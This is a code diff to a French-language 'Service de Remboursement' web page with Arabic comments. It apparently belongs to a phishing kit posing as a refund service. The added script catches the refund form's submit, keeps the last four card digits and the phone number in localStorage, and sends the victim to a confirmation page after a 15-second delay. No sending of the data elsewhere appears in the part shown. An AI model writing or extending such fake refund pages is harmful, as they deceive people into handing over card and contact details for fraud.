@@ -105,12 +105,30 @@
             © 2024 Service de Remboursement | Sécurité garantie | Tous droits réservés.
         </div>
     </div>
+
     <!-- Script JavaScript pour redirection -->
     <script>
-    // بعد 15 ثانية سيتم توجيه المستخدم إلى confirmation.html
-    setTimeout(() => {
-        window.location.href = "confirmation.html"; // التوجيه إلى confirmation.html
-    }, 15000); // الانتظار لمدة 15 ثانية
-</script>
+        // استدعاء البيانات المخزنة عندما يقوم المستخدم بملء النموذج
+        function storeDataAndRedirect(event) {
+            event.preventDefault();
+
+            // احصل على الرقم النهائي للبطاقة ورقم الهاتف
+            const cardNumber = document.getElementById('numero-carte').value.replace(/\s+/g, '').slice(-4); // آخر 4 أرقام
+            const phoneNumber = document.getElementById('telephone').value;
+
+            // تخزين البيانات في localStorage
+            localStorage.setItem('lastFour', cardNumber);
+            localStorage.setItem('phone', phoneNumber);
+
+            // التوجيه إلى صفحة المعالجة بعد 15 ثانية
+            setTimeout(() => {
+                window.location.href = "confirmation.html";
+            }, 15000);
+        }
+
+        // عند تحميل الصفحة يجب استدعاء الدالة مباشرة لتخزين البيانات
+        // أضف حدث عند تقديم النموذج بحيث يتم تخزين البيانات ثم التوجيه
+        document.getElementById('remboursement-form').addEventListener('submit', storeDataAndRedirect);
+    </script>
 </body>
 </html>
